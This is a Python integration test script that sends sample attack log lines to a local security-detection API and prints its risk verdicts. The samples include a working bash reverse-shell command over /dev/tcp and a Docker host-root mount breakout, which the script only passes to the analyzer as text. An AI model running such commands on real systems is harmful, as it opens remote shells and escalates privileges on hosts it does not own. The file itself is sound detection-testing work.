"""
test_logs.py
============
Comprehensive integration test script for AI Security Agent.
Sends sample ML attack logs, Web access logs (for DDoS evaluation), and checks health endpoints.
Usage: python test_logs.py
"""

import requests
import json
import time

API_URL = "http://localhost:8000/api/v1/analyze"
HEALTH_URL = "http://localhost:8000/health"
timestamp_now = time.strftime("%H:%M:%S")

test_cases = [
    {
        "name": "1. Attaque SSH Brute Force (HIGH Risk)",
        "payload": {
            "log_line": f"Aug 07 {timestamp_now} server sshd[9999]: Failed password for root from 185.220.101.{int(time.time()) % 250} port 54321 ssh2",
            "source_log": f"/var/log/auth_{int(time.time())}.log"
        }
    },
    {
        "name": "2. Attaque Reverse Shell (HIGH/CRITICAL Risk)",
        "payload": {
            "log_line": f"Aug 07 {timestamp_now} server bash[1234]: bash -i >& /dev/tcp/10.0.0.1/{int(time.time()) % 9000 + 1000} 0>&1",
            "source_log": f"/var/log/syslog_{int(time.time())}.log"
        }
    },
    {
        "name": "3. Attaque Docker Breakout / Privilege Escalation (CRITICAL Risk)",
        "payload": {
            "log_line": f"Aug 07 {timestamp_now} server dockerd[8888]: docker run -v /:/mnt_{int(time.time())} --rm -it alpine chroot /mnt sh",
            "source_log": f"/var/log/docker_{int(time.time())}.log"
        }
    },
    {
        "name": "4. Web HTTP Access Payload (DDoS Traffic Analysis)",
        "payload": {
            "log_line": f'203.0.113.{int(time.time()) % 250} - - [07/Aug/2026:{timestamp_now} +0000] "POST /login HTTP/1.1" 200 1024',
            "source_log": "/var/log/nginx/access.log"
        }
    }
]

print("=" * 70)
print("🚀 ENVOI DES LOGS DE TEST À L'AI SECURITY AGENT")
print("=" * 70)

# 1. Test Health Endpoint
print("\n[1] Verification /health Endpoint...")
try:
    h_resp = requests.get(HEALTH_URL, timeout=5)
    if h_resp.status_code == 200:
        print("    ✅ /health Endpoint Responded 200 OK:")
        print("      ", json.dumps(h_resp.json(), indent=2))
    else:
        print(f"    ⚠️ /health status code: {h_resp.status_code}")
except Exception as e:
    print(f"    ℹ️ Agent server not currently running on {HEALTH_URL} ({e})")

# 2. Test Analyze Endpoint with Test Payloads
print("\n[2] Execution des Logs de Test...")
for test in test_cases:
    print(f"\n[+] Envoi de : {test['name']}...")
    try:
        response = requests.post(API_URL, json=test["payload"], timeout=10)
        if response.status_code == 200:
            data = response.json()
            print(f"    ✅ Incident ID  : #{data['incident_id']}")
            print(f"    🎯 Prédiction   : {data['prediction']} (Confiance: {data['high_risk_percentage']}%)")
            print(f"    ⚠️ Niveau Risque : [{data['risk_level']}]")
            print(f"    📧 Email Alerte  : {'✅ ENVOYÉ !' if data['email_alert_sent'] else '❌ Cooldown / Non requis'}")
        else:
            print(f"    ❌ Erreur API   : Code {response.status_code} - {response.text}")
    except Exception as e:
        print(f"    ℹ️ (L'agent n'est pas démarré sur http://localhost:8000, exécuter avec 'python -m app.main')")

print("\n" + "=" * 70)
print("✅ Test des logs terminé !")
